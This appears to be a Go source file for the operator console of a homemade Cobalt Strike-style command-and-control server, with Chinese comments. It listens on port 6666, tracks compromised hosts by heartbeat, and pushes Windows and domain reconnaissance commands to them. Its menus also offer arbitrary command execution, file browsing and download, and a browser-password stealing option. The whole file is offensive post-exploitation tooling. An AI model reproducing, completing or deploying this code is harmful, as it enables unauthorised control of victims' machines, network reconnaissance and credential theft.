package main

import (
	"cobalt.Strike/cobalt.tcp"
	"fmt"
	"os/exec"
	"runtime"
	"time"
)

var Computer = runtime.GOOS

/*
当前任务列表
 搜集信息的时候可以选择全部都要，然后保存到文件中
1. 客户机设置
2. debug模式
bug : 	连接无法重新建立，一旦断开，就无法重新连接
		有些命令返回无法正常运行，会让客户端直接挂掉
		统一编码方式
*/
var ipChanMap = make(map[int]cobalt_tcp.HOSTS, cobalt_tcp.MaxConnect)

func main() {
	fmt.Println("正在启动\n")
	listener, err := cobalt_tcp.MyListen()
	if err != nil {
		fmt.Println("监听失败\n")
		fmt.Println(err)
	} else {
		go ipChanMap[0].Listener(listener, ipChanMap)
		fmt.Printf("开始监听端口6666\n")
	}
	for {
		menu()
	}

}

// 菜单函数
func menu() {
	var num int
	fmt.Printf("当前上线主机: %d\n", len(ipChanMap))
	fmt.Printf("主机编号\t主机ip\t主机最后一次心跳时间\t当前时间\t心跳频率\n")
	for id, host := range ipChanMap {
		host.PrintHost(id)
	}
	if len(ipChanMap) == 0 {
		fmt.Printf("按任意键刷新\n")
		fmt.Scanf("%d")
		return
	}

	if cobalt_tcp.Computer == "Windows" {
		fmt.Scanf("%s", &num)
	}
	for {
		n, err := fmt.Scanf("%d", &num)
		if n != 1 || err != nil {
			fmt.Printf("选择功能\n")
			fmt.Printf("1. 开始选择主机\n")
			fmt.Printf("0. 刷新\n")
			continue
		}
		break
	}

	switch num {
	case 1:
		ChangeHost()
	default:
		return
	}

}

func ChangeHost() {
	var contralId int
	fmt.Printf("按0返回上一级\n1.选择要查看的主机编号:\n")
	for id, host := range ipChanMap {
		fmt.Printf("%d\t%s\n", id+1, host.Ip)
	}
	if cobalt_tcp.Computer == "Windows" {
		fmt.Scanf("%s", &contralId)
	}
	for {
		okNum, _ := fmt.Scanf("%d", &contralId)
		if okNum != 1 || contralId < 0 || contralId > len(ipChanMap) { //第一次输入错误检测
			fmt.Printf("按0返回上一级\n1.选择要查看的主机编号:\n")
			continue
		} else if contralId == 0 {
			return
		}
		break
	}
	//exec.Command("clear")            // 清除屏幕
	//ipChanMap[contralId-1].SetHost() // 设置这个客户机

	hostss := ipChanMap[contralId-1]
	SetHost(&hostss)
	fmt.Printf("完成一次赋值")
	ipChanMap[contralId-1] = hostss

}

func ViewHost(hosts *cobalt_tcp.HOSTS) {
	//exec.Command("clear") // 清除屏幕
	var num int
	fmt.Printf("主机名及当前用户\t主机最后一次心跳时间\t当前时间\t心跳时间\t\n")
	fmt.Printf("%s\t\t%s\t%s\t%s\n", hosts.Whoami, hosts.Time,
		time.Now().Format("01-02 15:04:05"), hosts.Living)
	fmt.Printf("1. 进程查看\n")     //wmic process list brief
	fmt.Printf("2. 查看所有用户\n")   //net user
	fmt.Printf("3. 查看本地管理员\n")  // net localgroup administrators
	fmt.Printf("4. 查看主机ip信息\n") //ipconfig /all
	fmt.Printf("5. 查看路由表\n")    //route print
	fmt.Printf("6. 查看本机服务\n")   //wmic service list brief
	fmt.Printf("0. 返回上一层\n")
	fmt.Printf("\n请输入选项:  ")
	if Computer == "windows" {
		fmt.Scanf("%s", &num)
	}
	for {
		okNum, err := fmt.Scanf("%d", &num)
		if err != nil || okNum != 1 || num < 0 || num > 6 {
			//错误检测
			fmt.Printf("1. 进程查看\n")     //wmic process list brief
			fmt.Printf("2. 查看所有用户\n")   //net user
			fmt.Printf("3. 查看本地管理员\n")  // net localgroup administrators
			fmt.Printf("4. 查看主机ip信息\n") //ipconfig /all
			fmt.Printf("5. 查看路由表\n")    //route print
			fmt.Printf("6. 查看本机服务\n")   //wmic service list brief
			fmt.Printf("0. 返回上一层\n")
			fmt.Printf("\n请输入选项:  ")
			continue
		}
		break
	}
	switch num {
	case 1:
		hosts.SetCmd("wmic process list brief")
		defer ViewHost(hosts)
	case 2:
		hosts.SetCmd("net user")
		defer ViewHost(hosts)
	case 3:
		hosts.SetCmd("net localgroup administrators")
		defer ViewHost(hosts)
	case 4:
		hosts.SetCmd("ipconfig /all")
		defer ViewHost(hosts)
	case 5:
		hosts.SetCmd("route print")
		defer ViewHost(hosts)
	case 6:
		hosts.SetCmd("wmic service list brief")
		defer ViewHost(hosts)
	case 0:
		defer ViewHost(hosts)
	}
}
func SetHost(hosts *cobalt_tcp.HOSTS) {
	//defer menu() //最后的时候仍然调用menu函数
	exec.Command("clear") // 清除屏幕
	var num int
	fmt.Printf("主机名及当前用户\t主机最后一次心跳时间\t当前时间\t心跳频率\t\n")
	fmt.Printf("%s\t\t%s\t%s\t%s\n", hosts.Whoami, hosts.Time,
		time.Now().Format("01-02 15:04:05"), hosts.Living)
	fmt.Printf("1. 刷新\n")
	fmt.Printf("2. 主机信息搜集\n")
	fmt.Printf("3. 域信息搜集\n")
	fmt.Printf("4. 执行cmd指令\n")
	fmt.Printf("5. 文件浏览及下载\n")
	fmt.Printf("6. 一键获取浏览器密码\n")
	//fmt.Printf("7. 刷新\n")
	fmt.Printf("按0返回主界面\n")
	fmt.Printf("\n请输入选项:  ")
	if Computer == "windows" {
		fmt.Scanf("%s", &num)
	}
	for {
		okNum, err := fmt.Scanf("%d", &num)
		if err != nil || okNum != 1 || num < 0 || num > 6 {
			//错误检测
			fmt.Printf("1. 刷新\n")
			fmt.Printf("2. 主机信息搜集\n")
			fmt.Printf("3. 域信息搜集\n")
			fmt.Printf("4. 执行cmd指令\n")
			fmt.Printf("5. 文件浏览及下载\n")
			fmt.Printf("6. 一键获取浏览器密码\n")
			//fmt.Printf("7. 刷新\n")
			fmt.Printf("按0返回主界面\n")
			fmt.Printf("\n请输入选项:  ")
			continue
		}
		break
	}

	switch num {

	case 1:
		SetHost(hosts)
	case 2:
		ViewHost(hosts)
	case 3:
		ViewDemain(hosts)
	case 4:
		hosts.UseCmd()
	case 5:
		hosts.FileDeal()
	case 6:
	case 0:
		return

	}

}
func ViewDemain(hosts *cobalt_tcp.HOSTS) {
	var num int
	fmt.Printf("主机名及当前用户\t主机最后一次心跳时间\t当前时间\t心跳频率\t\n")
	fmt.Printf("%s\t\t%s\t%s\t%s\n", hosts.Whoami, hosts.Time,
		time.Now().Format("01-02 15:04:05"), hosts.Living)
	fmt.Printf("1. 查看域的名字\n")     //net config workstation
	fmt.Printf("2. 查询域列表\n")      //net view /domain
	fmt.Printf("3. 查看所有域用户组列表\n") //net group /domain
	fmt.Printf("4. 探测存活主机\n")     //arp -a
	fmt.Printf("5. 查看机器所属那个域\n")  //net config Workstation
	fmt.Printf("0. 返回上一层\n")
	fmt.Printf("\n请输入选项:  ")
	if Computer == "windows" {
		fmt.Scanf("%s", &num)
	}
	for {
		okNum, err := fmt.Scanf("%d", &num)
		if err == nil || okNum != 1 || num < 0 || num > 6 {
			//错误检测
			fmt.Printf("1. 查看域的名字\n")     //net config workstation
			fmt.Printf("2. 查询域列表\n")      //net view /domain
			fmt.Printf("3. 查看所有域用户组列表\n") //net group /domain
			fmt.Printf("4. 探测存活主机\n")     //arp -a
			fmt.Printf("5. 查看机器所属那个域\n")  //net config Workstation
			fmt.Printf("0. 返回上一层\n")
			fmt.Printf("\n请输入选项:  ")
			continue
		}
		break
	}
	switch num {
	case 1:
		hosts.SetCmd("net config workstation")
		defer ViewDemain(hosts)
	case 2:
		hosts.SetCmd("net view /domain")
		defer ViewDemain(hosts)
	case 3:
		hosts.SetCmd("net group /domain")
		defer ViewDemain(hosts)
	case 4:
		hosts.SetCmd("arp -a")
		defer ViewDemain(hosts)
	case 5:
		hosts.SetCmd("net config Workstation")
		defer ViewDemain(hosts)
	case 0:
		defer SetHost(hosts)
	}
}
